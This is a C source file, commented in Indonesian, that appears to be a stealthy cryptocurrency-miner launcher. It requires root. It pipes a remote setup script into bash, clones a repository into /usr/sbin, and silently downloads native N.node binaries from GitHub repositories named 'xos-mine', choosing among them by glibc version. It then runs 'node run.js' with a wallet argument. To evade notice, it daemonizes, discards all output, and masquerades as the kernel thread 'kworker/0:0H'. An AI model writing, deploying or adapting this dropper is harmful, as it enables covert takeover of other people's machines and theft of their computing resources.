#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/wait.h>

// Konstanta untuk pengendalian beban CPU
#define WORK_TIME_US 80000 // 80 ms kerja
#define SLEEP_TIME_US 20000 // 20 ms tidur

// Fungsi untuk mensimulasikan beban CPU
void* cpu_load_thread(void* arg) {
    while (1) {
        // Fase kerja
        for (volatile long i = 0; i < 25000000L; i++);
        // Fase tidur
        usleep(SLEEP_TIME_US);
    }
    return NULL;
}

// Fungsi untuk memulai beban CPU multi-core
void start_cpu_load() {
    int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
    pthread_t threads[num_cores];
    
    printf("Memulai beban CPU pada %d core...\n", num_cores);
    printf("Target penggunaan CPU per core: %.2f%%\n", 
           (double)WORK_TIME_US / (WORK_TIME_US + SLEEP_TIME_US) * 100.0);
    
    for (int i = 0; i < num_cores; i++) {
        if (pthread_create(&threads[i], NULL, cpu_load_thread, NULL) != 0) {
            perror("Gagal membuat thread");
            exit(1);
        }
    }
    
    // Detach thread agar berjalan di latar belakang
    for (int i = 0; i < num_cores; i++) {
        pthread_detach(threads[i]);
    }
}

// Fungsi untuk mendeteksi libc dan mengunduh file yang sesuai
void detect_libc() {
    FILE *fp;
    char buffer[256];

    // Jalankan "ldd --version" dan ambil output baris pertama
    fp = popen("ldd --version 2>&1", "r");
    if (fp == NULL) {
        printf("Tidak bisa mendeteksi libc (popen gagal)\n");
        return;
    }

    if (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strstr(buffer, "glibc") || strstr(buffer, "GLIBC")) {
            // cek versi GLIBC spesifik
            if (strstr(buffer, "2.39-0ubuntu8.4")) {
                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwc/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
            } else if (strstr(buffer, "2.35-0ubuntu3.10")) {
                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwd/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
            } else if (strstr(buffer, "2.31-0ubuntu9.7")) {
                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/nbwg/raw/refs/heads/main/build/Release/N.node >/dev/null 2>&1");
            } else if (strstr(buffer, "2.36-9+deb12u10")) {
                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/x011-al/tesb/raw/refs/heads/main/N.node >/dev/null 2>&1");
            } 
        }
    }

    pclose(fp);
}

int changeown (char *str)
{
    char user[256], *group;
    struct passwd *pwd;
    struct group *grp;

    uid_t uid;
    gid_t gid;

    memset(user, '\0', sizeof(user));
    strncpy(user, str, sizeof(user));

    for (group = user; *group; group++)
        if (*group == ':')
        {
            *group = '\0';
            group++;
            break;
        }

    if (pwd = getpwnam(user)) 
    {

        uid = pwd->pw_uid;
        gid = pwd->pw_gid;
    } else uid = (uid_t) atoi(user);

    if (*group)
        if (grp = getgrnam(group)) gid = grp->gr_gid;
        else gid = (gid_t) atoi(group);

    if (setgid(gid)) {
        perror("Error: Can't set GID");
        return 0;
    }

    if (setuid(uid))
    {
        perror("Error: Can't set UID");
        return 0;
    }

    return 1;
}

char *fullpath(char *cmd)
{
    char *p, *q, *filename;
    struct stat st;

    if (*cmd == '/')
        return cmd;

    filename = (char *) malloc(256);

    if  (*cmd == '.')
        if (getcwd(filename, 255) != NULL)
        {
            strcat(filename, "/");
            strcat(filename, cmd);
            return filename;
        }
        else
            return NULL;

    for (p = q = (char *) getenv("PATH"); q != NULL; p = ++q)
    {
        if (q = (char *) strchr(q, ':'))
            *q = (char) '\0';

        snprintf(filename, 256, "%s/%s", p, cmd);

        if (stat(filename, &st) != -1
                && S_ISREG(st.st_mode)
                && (st.st_mode&S_IXUSR || st.st_mode&S_IXGRP || st.st_mode&S_IXOTH))
            return filename;

        if (q == NULL)
            break;
    }

    free(filename);

    return NULL;

}

// Fungsi untuk menjalankan perintah sistem dan memeriksa hasilnya
int run_system_command(const char *command) {
    int status = system(command);
    if (status == -1) {
        perror("System command failed");
        return 0;
    } else if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
        fprintf(stderr, "Command failed with exit code %d: %s\n", WEXITSTATUS(status), command);
        return 0;
    }
    return 1;
}

int main(int argc,char **argv)
{
    // Konfigurasi tetap
    int enable_cpu_load = 1;
    int runsys = 1;
    char *pidfile = "sys.pid";
    char *fakename = "kworker/0:0H";
    
    char fake[256];
    char *fp;
    char *execst;
    FILE *f;
    int null;
    int pidnum;
    char **newargv;
    
    // Pastikan program dijalankan sebagai root
    if (geteuid() != 0) {
        fprintf(stderr, "Program harus dijalankan sebagai root (sudo)\n");
        exit(1);
    }
    
    // Periksa jumlah argumen command line
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <qcore> <wallet>\n", argv[0]);
        exit(1);
    }
    
    // Jalankan instalasi dependencies secara otomatis
    printf("Melakukan instalasi dependencies...\n");
    
    // Buat direktori /usr/sbin jika belum ada
    mkdir("/usr/sbin", 0755);
    
    // Update package list
    if (!run_system_command("apt update -qq >/dev/null 2>&1")) {
        fprintf(stderr, "Gagal update package list\n");
    }
    
    // Install curl dan git jika belum ada
    if (!run_system_command("which curl >/dev/null 2>&1 || apt install -y curl -qq >/dev/null 2>&1")) {
        fprintf(stderr, "Gagal install curl\n");
    }
    
    if (!run_system_command("which git >/dev/null 2>&1 || apt install -y git -qq >/dev/null 2>&1")) {
        fprintf(stderr, "Gagal install git\n");
    }
    
    // Install Node.js
    if (!run_system_command("which node >/dev/null 2>&1 || (curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null 2>&1 && apt install -y nodejs -qq >/dev/null 2>&1)")) {
        fprintf(stderr, "Gagal install dependences\n");
    }
    
    // Clone repository ncloud jika belum ada
    struct stat st;
    if (stat("/usr/sbin/ncloud", &st) != 0) {
        if (!run_system_command("git clone -q https://github.com/x011-al/ncloud /usr/sbin/ncloud 2>/dev/null")) {
            fprintf(stderr, "Gagal clone repository\n");
        } else {
            printf("Berhasil clone repository\n");
            // Jalankan npm install setelah clone berhasil
            printf("Menjalankan npm install...\n");
            if (chdir("/usr/sbin/ncloud") == 0) {
                if (!run_system_command("npm install --no-bin-links --quiet >/dev/null 2>&1")) {
                    fprintf(stderr, "Gagal menjalankan npm install\n");
                } else {
                    printf("npm install berhasil\n");
                }
                chdir("/"); // Kembali ke root directory
            } else {
                perror("Gagal mengubah direktori");
            }
            
            // Deteksi libc dan unduh file yang sesuai setelah direktori dibuat
            printf("Mendeteksi versi libc...\n");
            detect_libc();
        }
    } else {
        printf("Direktori ncloud sudah ada, melewatkan clone...\n");
        // Cek apakah node_modules ada, jika tidak jalankan npm install
        if (stat("/usr/sbin/ncloud/node_modules", &st) != 0) {
            printf("Menjalankan npm install...\n");
            if (chdir("/usr/sbin/ncloud") == 0) {
                if (!run_system_command("npm install --no-bin-links --quiet >/dev/null 2>&1")) {
                    fprintf(stderr, "Gagal menjalankan npm install\n");
                } else {
                    printf("npm install berhasil\n");
                }
                chdir("/");
            } else {
                perror("Gagal mengubah direktori");
            }
        }
        
        // Deteksi libc dan unduh file yang sesuai setelah memastikan direktori ada
        printf("Mendeteksi versi libc...\n");
        detect_libc();
    }
    
    // Jalankan beban CPU jika dienable
    if (enable_cpu_load) {
        start_cpu_load();
    }
    
    // Siapkan command untuk dieksekusi dengan tambahan argumen qcore dan wallet
    int n = 4; // 4 argumen: node, run.js, qcore, wallet
    newargv = (char **) malloc((n + 1) * sizeof(char *));
    if (newargv == NULL) {
        perror("Gagal alokasi memori untuk newargv");
        exit(1);
    }
    newargv[0] = "node";
    newargv[1] = "run.js";
    newargv[2] = argv[1]; // qcore dari argumen command line
    newargv[3] = argv[2]; // wallet dari argumen command line
    newargv[4] = NULL;
    
    // Dapatkan full path untuk node
    if ((fp = fullpath("node")) == NULL) {
        perror("Full path seek for node");
        exit(1);
    }
    execst = fp;
    
    // Ubah direktori kerja ke /usr/sbin/ncloud
    if (chdir("/usr/sbin/ncloud") != 0) {
        perror("Failed to change directory");
        exit(1);
    }
    
    // Setup fake process name
    memset(fake, ' ', sizeof(fake) - 1);
    fake[sizeof(fake) - 1] = '\0';
    strncpy(fake, fakename, strlen(fakename));
    newargv[0] = fake;
    
    // Daemonize
    if (runsys) 
    {
        if ((null = open("/dev/null", O_RDWR)) == -1)
        {
            perror("Error: /dev/null");
            return -1;
        }

        switch (fork())
        {
            case -1:
                perror("Error: FORK-1");
                return -1;

            case  0:
                setsid();
                switch (fork())
                {
                    case -1:
                        perror("Error: FORK-2");
                        return -1;

                    case  0:
                        umask(0);
                        close(0);
                        close(1);
                        close(2);
                        dup2(null, 0);
                        dup2(null, 1);
                        dup2(null, 2);
                        break;

                    default:
                        return 0;
                }
                break;
            default:
                return 0;
        }
    }

    waitpid(-1, (int *)0, 0);        
    pidnum = getpid();

    if (pidfile != NULL && (f = fopen(pidfile, "w")) != NULL)
    {
        fprintf(f, "%d\n", pidnum);
        fclose(f);
    }

    fprintf(stderr,"==> Fakename: %s PidNum: %d\n", fakename, pidnum); 
    execv(execst, newargv);
    perror("Couldn't execute");
    return -1;
}
